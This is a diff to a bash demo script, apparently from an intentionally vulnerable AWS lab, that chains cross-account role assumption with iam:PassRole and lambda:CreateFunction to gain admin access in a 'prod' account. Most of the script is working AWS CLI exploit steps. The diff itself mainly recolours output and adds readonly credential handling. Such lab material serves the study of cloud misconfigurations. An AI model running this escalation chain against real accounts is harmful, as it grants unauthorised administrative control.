@@ -8,10 +8,16 @@
 # Disable AWS CLI paging
 export AWS_PAGER=""
 
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
 # Dim color for command display
 DIM='\033[2m'
 CYAN='\033[0;36m'
-NC='\033[0m'
 
 # Track attack commands for summary
 ATTACK_COMMANDS=()
@@ -29,35 +35,57 @@ show_attack_cmd() {
     ATTACK_COMMANDS+=("$*")
 }
 
-echo "🚀 Starting Cross-Account PassRole to Lambda Admin Attack Demo"
-echo "=============================================================="
+echo -e "${BLUE}=== Cross-Account PassRole to Lambda Admin Attack Demo ===${NC}"
+echo "Attack path: pl-pathfinding-starting-user-dev"
+echo "  -> pl-lambda-prod-updater (dev) -> pl-lambda-updater (prod)"
+echo "  -> iam:PassRole + lambda:CreateFunction -> admin access"
+echo ""
 
 # Check if AWS CLI is installed
 if ! command -v aws &> /dev/null; then
-    echo "❌ AWS CLI is not installed or not in PATH"
+    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
     exit 1
 fi
 
 # Check if we have the required profile
 if ! aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev &> /dev/null; then
-    echo "❌ AWS profile 'pl-pathfinding-starting-user-dev' not found"
-    echo "Please run: ./create_pathfinding_profiles.sh"
+    echo -e "${RED}Error: AWS profile 'pl-pathfinding-starting-user-dev' not found${NC}"
+    echo "Please configure the profile first."
     exit 1
 fi
 
-echo "✅ AWS CLI and profile configured"
+# Retrieve readonly credentials for observation steps
+cd ../../../../../..  # Navigate to root of terraform project
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-# Step 1: Assume the dev lambda-prod-updater role
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+cd - > /dev/null
+
+# Credential switching helpers
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
 echo ""
-echo "📋 Step 1: Assuming dev lambda-prod-updater role..."
+
+# [EXPLOIT] Step 1: Assume the dev lambda-prod-updater role
+echo -e "${YELLOW}Step 1: Assuming dev lambda-prod-updater role${NC}"
 show_cmd "Attacker" "aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text"
 DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
 DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"
 
 echo "Assuming role: $DEV_ROLE_ARN"
 
-# Get temporary credentials for the dev role
-show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-prod-updater-session" --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn \"$DEV_ROLE_ARN\" --role-session-name \"lambda-prod-updater-session\" --output json"
 DEV_TEMP_CREDS=$(aws sts assume-role \
     --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
@@ -65,51 +93,57 @@ DEV_TEMP_CREDS=$(aws sts assume-role \
     --output json)
 
 if [ $? -ne 0 ]; then
-    echo "❌ Failed to assume dev lambda-prod-updater role"
+    echo -e "${RED}Error: Failed to assume dev lambda-prod-updater role${NC}"
     exit 1
 fi
 
-# Extract credentials
+# Extract assumed-role credentials (do NOT replace with helper - these are session token creds)
 export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')
 export AWS_DEFAULT_REGION="us-west-2"
 
-echo "✅ Successfully assumed dev lambda-prod-updater role"
-
-# Step 2: Get the prod account ID and assume the prod lambda-updater role
+echo -e "${GREEN}✓ Successfully assumed dev lambda-prod-updater role${NC}"
 echo ""
-echo "📋 Step 2: Getting prod account ID and assuming prod lambda-updater role..."
 
-# Get the prod account ID using admin cleanup profile
-PROD_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-admin-cleanup-prod --query 'Account' --output text)
+# [OBSERVATION] Step 2a: Get prod account ID using readonly creds
+echo -e "${YELLOW}Step 2: Getting prod account ID and assuming prod lambda-updater role${NC}"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
+PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 PROD_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-lambda-updater"
 
 echo "Found prod account: $PROD_ACCOUNT_ID"
+
+# [EXPLOIT] Step 2b: Assume the prod lambda-updater role using dev role credentials
+# Re-activate dev assumed-role credentials before cross-account assume-role
+export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')
+
 echo "Assuming role: $PROD_ROLE_ARN"
 
-# Assume the prod role using current dev role credentials
-show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_ARN" --role-session-name "lambda-updater-prod-session" --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$PROD_ROLE_ARN\" --role-session-name \"lambda-updater-prod-session\" --output json"
 PROD_TEMP_CREDS=$(aws sts assume-role \
     --role-arn "$PROD_ROLE_ARN" \
     --role-session-name "lambda-updater-prod-session" \
     --output json)
 
 if [ $? -ne 0 ]; then
-    echo "❌ Failed to assume prod lambda-updater role"
+    echo -e "${RED}Error: Failed to assume prod lambda-updater role${NC}"
     exit 1
 fi
 
-# Extract prod credentials
+# Extract prod assumed-role credentials (do NOT replace with helper - these are session token creds)
 export AWS_ACCESS_KEY_ID=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SessionToken')
 
-echo "✅ Successfully assumed prod lambda-updater role"
+echo -e "${GREEN}✓ Successfully assumed prod lambda-updater role${NC}"
 
-# Step 3: Test PassRole privilege escalation
+# [EXPLOIT] Step 3: PassRole privilege escalation - create Lambda with admin role
 echo ""
-echo "📋 Step 3: Testing PassRole privilege escalation..."
+echo -e "${YELLOW}Step 3: PassRole privilege escalation - creating Lambda with admin role${NC}"
 echo "The lambda-updater role has iam:PassRole permission."
 echo "We can now create a Lambda function that uses the Lambda-admin role."
 
@@ -166,19 +200,18 @@ LAMBDA_RESULT=$(aws lambda create-function \
     --output json)
 
 if [ $? -eq 0 ]; then
-    echo "✅ Successfully created Lambda function with admin role! Waiting for 5 seconds..."
+    echo -e "${GREEN}✓ Successfully created Lambda function with admin role! Waiting for 5 seconds...${NC}"
     FUNCTION_NAME=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionName')
     echo "Function name: $FUNCTION_NAME"
 
-    # Sleep for 5 seconds
+    # Sleep for 5 seconds to allow Lambda to initialize
     sleep 5
 
-    # Step 4: Test the Lambda function
+    # [EXPLOIT] Step 4: Invoke the Lambda function to demonstrate admin access
     echo ""
-    echo "📋 Step 4: Testing the Lambda function..."
-    echo "Invoking the Lambda function to test admin access..."
+    echo -e "${YELLOW}Step 4: Invoking Lambda function to demonstrate admin access${NC}"
 
-    show_attack_cmd "Attacker" "aws lambda invoke --function-name "$FUNCTION_NAME" --payload '{}' /tmp/lambda_response.json --output json"
+    show_attack_cmd "Attacker" "aws lambda invoke --function-name \"$FUNCTION_NAME\" --payload '{}' /tmp/lambda_response.json --output json"
     INVOKE_RESULT=$(aws lambda invoke \
         --function-name "$FUNCTION_NAME" \
         --payload '{}' \
@@ -186,14 +219,14 @@ if [ $? -eq 0 ]; then
         --output json)
 
     if [ $? -eq 0 ]; then
-        echo "✅ Lambda function invocation completed"
+        echo -e "${GREEN}✓ Lambda function invocation completed${NC}"
         echo "Response:"
         cat /tmp/lambda_response.json | jq '.'
         echo ""
 
         # Check if the function returned an error
         if cat /tmp/lambda_response.json | jq -e '.errorType' > /dev/null 2>&1; then
-            echo "❌ Lambda function executed but there was an error"
+            echo -e "${RED}Error: Lambda function executed but there was an error${NC}"
             ERROR_TYPE=$(cat /tmp/lambda_response.json | jq -r '.errorType')
             ERROR_MESSAGE=$(cat /tmp/lambda_response.json | jq -r '.errorMessage')
             echo "Error Type: $ERROR_TYPE"
@@ -217,7 +250,7 @@ if [ $? -eq 0 ]; then
 
 
 else
-    echo "❌ Failed to create Lambda function with admin role"
+    echo -e "${RED}Error: Failed to create Lambda function with admin role${NC}"
     echo "This could be because:"
     echo "1. The lambda-updater role doesn't have iam:PassRole permission"
     echo "2. The Lambda-admin role doesn't exist or isn't properly configured"
@@ -234,7 +267,7 @@ unset AWS_SECRET_ACCESS_KEY
 unset AWS_SESSION_TOKEN
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
-    echo -e "\n\033[1;33mAttack Commands:\033[0m"
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
         echo -e "  ${CYAN}\$ ${cmd}${NC}"
     done
@@ -242,8 +275,7 @@ fi
 
 echo ""
 if [ "$ATTACK_SUCCESS" = "true" ]; then
-    echo "✅ ATTACK SUCCESSFUL!"
-    echo "======================"
+    echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
     echo "The attack successfully demonstrated multi-hop privilege escalation:"
     echo "1. Dev user pl-pathfinding-starting-user-dev assumed dev role pl-lambda-prod-updater"
     echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
